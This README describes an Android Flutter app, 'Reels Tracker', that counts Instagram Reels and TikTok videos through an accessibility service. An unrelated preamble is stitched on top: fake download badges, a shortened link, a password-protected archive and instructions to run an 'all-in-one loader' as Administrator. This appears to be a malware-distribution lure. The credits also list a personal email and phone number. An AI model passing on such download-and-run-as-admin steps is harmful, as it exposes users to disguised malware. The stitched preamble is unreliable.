<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

<img src="assets/app_icon.png" alt="Reels Tracker" width="112" />

# Reels Tracker

**Counts the short videos you scroll through — and the hours they quietly take.**

Instagram Reels and TikTok, measured on your own phone. No account, no server,
no analytics, and no internet permission in release builds.

## Features

**Counting**

- Counts Instagram Reels and TikTok videos as you swipe, while the app is closed.
- One video per swipe — never per accessibility event — guarded by a pager index
  and a cooldown.
- Sessions timed from real timestamps: nothing polls, no timer runs in the
  background, and time never accrues while you are outside the feed or the phone
  is locked.
- A session crossing midnight is split at the boundary, so each day gets exactly
  the time that belongs to it.

**Seeing it**

| View | What it shows |
| --- | --- |
| **Dashboard** | Today's count and time, a live ring, the last 7 days, the last 30 as a trend, and when today's watching happened |
| **Statistics** | Today / week / month / year / all-time totals, averages, longest session, busiest day |
| **Year grid** | A GitHub-style square per day, month abbreviations across the top, shaded in four steps by quartile so one heavy day cannot flatten the year |
| **Month calendar** | The month as a calendar, each day shaded and tappable |
| **Hourly strip** | Which hours of the day the watching lives in |
| **By weekday** | The average for each day of the week |
| **By app** | A ring splitting the period between Instagram and TikTok |
| **History** | Every session, grouped by day, with a per-day detail screen |

Every chart says what a mark is worth when you touch it, tells you its scale in
the legend, and reads aloud correctly under a screen reader.

**Control**

- Optional daily goal, in videos or in minutes — off by default.
- Optional notification when you pass it, and one optional daily summary.
- Optional floating counter over the feed, and an optional reminder card once the
  goal is passed (it never blocks; every way out is one tap).
- Filter the whole app to one tracked app.
- Export and import your history as a file; clear today or clear everything.
- Light, dark, or system theme; full reduced-motion support.

## Screens

Onboarding · Dashboard · Statistics · History · Day detail · Settings ·
Detection diagnostics.

<!--
  Screenshots: drop PNGs into docs/screenshots/ and uncomment this table.

  | Dashboard | Statistics | Year grid | Settings |
  | --- | --- | --- | --- |
## Quick start

### Requirements

| | |
| --- | --- |
| Flutter | 3.44 or newer (built on 3.44.7, stable) |
| Dart | 3.12.2 |
| Android | A physical device. The emulator has no Instagram to watch |
| IDE | Anything — the project is a standard `flutter create` layout |

### Run it

```bash
git clone <your-fork-url> insta_reels
cd insta_reels
flutter pub get
flutter run
```

Release build:

```bash
flutter build apk --release          # or: flutter build appbundle --release
```

### Then, in the app

1. Read the permission explanation on first launch.
2. Tap **Enable Tracking** — this opens Android's accessibility settings.
3. Find **Reels Tracker** in the list and switch it on.
4. Come back. The dashboard shows `0 Reels` until real activity is detected;
   there is no sample data anywhere in the app.

The permission cannot be granted from inside the app, and it does not try.

### The first run

Four intro screens explain the app before it asks for anything: what it is, that
it counts every swipe across Instagram Reels and TikTok, what the statistics
look like, and — last — what the accessibility permission is for and what the
app will never read. The permission is requested on the final screen and can be
declined without the app becoming unusable.

The pages track the finger one-to-one; each illustration drifts against its own
text as they move, so the depth comes from the gesture rather than from an
animation played at the user. All of it is replaced by a plain cross-fade when
the system asks for reduced motion.

## How it works

Android lets an *accessibility service* know which app is in the foreground and
when a list on screen is scrolled. That is the only signal available for this —
Instagram publishes no figure for Reels watched — and it is all this app uses.

```
  Instagram or TikTok on screen
          │
          ▼
  ReelsAccessibilityService     receives events, does no interpreting itself
          │
          ├──▶ TrackedApps               what each app looks like — data, not code
          │
          ├──▶ ShortVideoDetector        is the feed on screen? did it scroll?
          │
          ├──▶ ReelSessionTracker        state machine: when does a video count?
          │
          └──▶ TrackingStore             writes sessions to disk as they happen
                      │
                      ▼
              Flutter drains on resume ──▶ statistics, charts, history
```

### Counting a Reel

A Reel is **not** counted per accessibility event — those fire many times a
second. The tracker runs a state machine:

```
IDLE → INSTAGRAM_FOREGROUND → REELS_ACTIVE ⇄ (Reel changed) → session closed
```

- Entering Reels opens a session, and the Reel already on screen counts as one.
- Watching it adds nothing.
- Each swipe to the next Reel adds one.

Two mechanisms keep that honest:

- **Pager index.** When Instagram's pager reports its position, a Reel is counted
  only when the position actually changes. Repeated events for the same Reel
  cannot be miscounted at all.
- **Cooldown.** When no position is available, a swipe counts at most once per
  350 ms, so one swipe's burst of events stays one Reel.

A single pager jump is capped at three Reels: a real fling passes over two or
three, anything larger is a re-layout artefact and is not trusted.

### Measuring time

A session opens when Reels are recognised on screen and closes when you leave
Reels, leave Instagram, or the screen turns off. Duration is the difference
between two timestamps — nothing polls and no timer runs in the background.

Time is never counted while you are outside Reels or while the phone is locked.
A session crossing midnight is split at the boundary, so each day gets exactly
the time that belongs to it.

### Battery: sleeping and waking

An accessibility service is bound for as long as it is enabled, but what it
*costs* is decided by how many events Android has to deliver to it. A service
listening for scrolls across every app receives a call into its process every
time anyone scrolls anything, all day. Throwing those events away on arrival
does not make them free — the delivery is the cost, and it is the reason
accessibility apps get blamed for battery drain.

So the service reconfigures itself at runtime:

| | Package filter | Events delivered |
| --- | --- | --- |
| **Sleeping** — no tracked app in front | Instagram and TikTok only | window changes only |
| **Awake** — a tracked app is in front | none | window changes, content changes, scrolls |

While sleeping, **nothing from any other app reaches this process at all.** The
one event that survives is the one that ends it: Instagram or TikTok showing a
window. The service wakes itself, tracks, and drops back to sleeping the moment
another app comes forward or the screen turns off.

Nothing polls. No timer runs while asleep. Durations come from timestamps.

### Surviving the app being closed

This matters more than anything else here: **while you are watching Reels, this
app is closed.** Anything sent only over a platform channel would arrive at a
Flutter engine that does not exist and be lost.

So the native side owns durable storage. Sessions and counts are written to
`SharedPreferences` as they happen, and Flutter drains that queue the next time
it runs. Sessions merge on their start time, so draining twice never
double-counts. The live channel only makes an open dashboard update sooner.

## Privacy

The service reads **structure**, not content: whether a view belonging to
Instagram's Reels player is on screen, and whether it scrolled. It never reads
messages, notifications, account details, passwords, or any text at all.

What is stored, in full:

| Stored | Not stored |
| --- | --- |
| Session start and end timestamps | Anything you watched |
| Number of Reels detected per session | Any text on screen |
| Per-day totals derived from the above | Any account or device identifier |
| Your own settings | Screenshots, media, network data |

`AndroidManifest.xml` declares **no INTERNET permission** in release builds.
Debug builds get one only so Flutter's development tooling can attach. The only
other permissions are notifications (opt-in) and the overlay permission for the
optional floating counter (opt-in).

Android's Auto Backup is also switched off (`allowBackup="false"` plus
`data_extraction_rules.xml` excluding every domain from both cloud backup and
device-to-device transfer). By default Android uploads an app's files to the
user's Google Drive, which would have quietly broken the promise this app makes
on its own onboarding screen. It is still an upload, however private the
destination — so it does not happen.

While sleeping — which is nearly all of the time — the service is restricted to
Instagram's and TikTok's packages and receives nothing whatsoever from any other
app. It drops that filter only while one of them is in the foreground, and only
because the sole reliable way to know you *left* is to see another app come
forward. Even then, events from other apps are discarded on the first line of
`onAccessibilityEvent`, where the package name is read and nothing else is.

## Limitations — read this before trusting a number

These are **detected Reels**, a careful estimate. They are not an official
Instagram statistic, and the app says so on its own home screen.

- Instagram controls its interface and can change it. When its identifiers stop
  matching, detection falls back to recognising the *shape* of a full-screen
  vertical swipe — and the app tells you it is no longer certain rather than
  quietly reporting less. **Settings → Detection diagnostics** shows the
  identifiers actually on screen and lets you adopt them, without a new build.
- **TikTok is measured differently, and less precisely.** Its view identifiers
  are obfuscated and change between releases, so there is nothing stable to
  match on. Detection is structural instead: TikTok opens straight into an
  autoplaying feed, so being in the app opens a session, and a video swipe is
  recognised by its shape — a vertical scroll on a view that fills the screen.
  The consequence is an over-count: time spent in TikTok's inbox or profile is
  counted as watching. TikTok's landing screen plays video immediately, so this
  is right far more often than it is wrong, but it is an approximation.
- Very fast scrolling can be undercounted. The counter is deliberately
  conservative: it would rather miss a Reel than invent one.
- On Android 13 and earlier the fallback path is less precise, because the API
  that reports scroll distance only exists from Android 14.
- **Android 17 Advanced Protection Mode** revokes accessibility access for apps
  that are not accessibility tools. Reels Tracker is a usage tracker, not an
  accessibility tool, and does not claim to be one — so with that mode on,
  tracking will not run. The app reports this rather than showing zeros.

## Fixing detection after an Instagram update

**From inside the app, no build needed.** Settings → Detection diagnostics.
Turn on capture, open the app that stopped working, watch a few videos, then
come back. The view identifiers that were on screen are listed; tick the ones
that look like the video player and save them. "Reset to defaults" undoes it.

Capture is off by default and the identifiers are held in memory only — they are
never written to disk.

**In code**, everything app-specific lives in one file:
`android/app/src/main/kotlin/com/example/insta_reels/TrackedApps.kt`

Each app is one `TrackedApp` entry:

| Field | What it is |
| --- | --- |
| `markers` | Substrings that identify the video player |
| `exclusions` | Things that must never count |
| `pagerIds` | The container that pages between videos |
| `feedIsTheApp` | True when being in the app *is* the evidence (TikTok) |
| `requireFullScreenScroller` | Only count scrolls on a view filling the display |

Adding another short-video app is one more entry in that list.

One trap worth knowing: **Instagram's own identifiers use `reel` for Stories.**
The Reels player is built from views named `clips_*`. Matching on `reel` counts
Stories, which is why Stories identifiers are excluded explicitly.

## Manual test checklist

This project is verified with `flutter analyze` only — there are no test files,
by design. Detection depends on a real Instagram running on a real device, which
is not something a widget test can stand in for. Work through this by hand:

<details>
<summary><strong>Counting</strong></summary>

1. Open Instagram Reels. Watch one Reel without swiping → count reads `1`.
2. Swipe once → `2`. Swipe again → `3`.
3. Swipe rapidly ten times → the count rises by roughly ten, never by hundreds.
4. Sit on one Reel for a minute → the count does not move.
5. Open **Stories** and tap through several → the count does not move.
6. Swipe sideways between Instagram's tabs → the count does not move.
7. In TikTok, swipe up through the feed → the count rises one per video.
8. In TikTok, scroll a profile grid or the comment sheet → it does not move.
9. Pull down the notification shade mid-Reel, then close it → the session
   continues; it is not split into two.

</details>

<details>
<summary><strong>Sessions and time</strong></summary>

10. Leave Instagram → the session ends; time stops at that moment.
11. Return later → a new session begins, and the session count goes up.
12. Lock the phone mid-Reel → time stops immediately, not after a timeout.
13. Watch across midnight → the time lands on both days, split at the boundary.

</details>

<details>
<summary><strong>Reliability</strong></summary>

14. Disable accessibility access → the app shows the permission warning.
15. Re-enable it → tracking resumes.
16. Force-stop the app mid-session, reopen → the session is recovered, not lost.
17. Restart the phone → tracking resumes without reopening the app.
18. Change the device date → statistics stay on the correct days.
19. Uninstall Instagram → the app says there is nothing to track.
20. Export, clear all data, then import → the history comes back intact.

</details>

<details>
<summary><strong>Notifications and the reminder</strong></summary>

21. Set a goal of 3 videos, enable notifications, watch 3 → one notification.
22. Keep watching → it does not fire again that day.
23. Enable "Remind me on screen", pass the goal → the card appears over the feed.
24. Tap **Keep watching** → it closes and does not return for the snooze period.
25. Pass the goal again, press the system **back** button → it closes the same way.
26. Tap **Close the app** → you land on the home screen and the session ends.

</details>

<details>
<summary><strong>Battery</strong></summary>

27. With no tracked app open, use the phone normally for a while. Reels Tracker
    should not appear meaningfully in Android's battery usage list — while
    sleeping it receives no events from any other app.

</details>

## Project layout

```
lib/
  main.dart              entry point; loads data before the first frame
  app.dart               scope, theme host, four-tab shell
  models/                DailyStats, ReelSession, AppSettings, TrackingStatus
  screens/               home, history, statistics, settings, onboarding,
                         detection diagnostics
  widgets/               glass card, nav bar, charts, counters, banner,
                         developer card and copyright line
  services/              app state, tracking bridge, insights, notifications
  storage/               the single JSON document, written atomically
  utils/                 spring motion, formatters, date ranges
assets/
  app_icon.png           the app mark, shown in the intro and in About

android/app/src/main/kotlin/com/example/insta_reels/
  ReelsAccessibilityService.kt   receives events; sleeps and wakes itself
  TrackedApps.kt                 what each tracked app looks like — data only
  ShortVideoDetector.kt          reads an event through an app's profile
  ReelSessionTracker.kt          the counting state machine
  TrackingStore.kt               durable native storage
  TrackingBridge.kt              method and event channels
  ReelsNotifications.kt          the goal notification
  ReelsOverlayController.kt      the optional floating counter
  ReelsLimitPrompt.kt            the on-screen reminder past the goal
  MainActivity.kt                hosts Flutter, opens the channels
```

**Where logic lives:** Kotlin decides what happened on screen. Flutter owns
statistics, storage and presentation. Neither side computes what the other one
does, so two figures can never disagree.

**Storage** is one JSON file, not a database — the data is a few hundred bytes
per day, and a plain document makes export and import nearly free. Writes go to
a temporary file and are renamed into place, so a process kill mid-write can
never leave a half-written history.

## Tech stack

| | |
| --- | --- |
| UI | Flutter, one codebase, no state-management package — an `InheritedNotifier` scope |
| Detection | Kotlin `AccessibilityService`, method + event channels |
| Storage | One atomically-written JSON document (Flutter) and `SharedPreferences` (native queue) |
| Packages | `path_provider`, `intl`, `flutter_local_notifications`, `timezone`, `flutter_timezone`, `share_plus`, `file_picker`, `url_launcher`, `cupertino_icons` |
| Lints | `flutter_lints`, and the project analyses clean |

## Before publishing

- [ ] Change the application ID from `com.example.insta_reels` to your own.
- [ ] Add a real signing config — release currently signs with the debug key.
- [ ] Google Play requires prominent disclosure and consent for accessibility
      use. The onboarding screen is written to serve that; check it against
      current policy before submitting.

## Credits

Designed and built by **Rahoz Osman**.

- hozahoza2001@gmail.com
- 07502076151

© Rahoz Osman. The line appears at the foot of the home screen and in Settings.
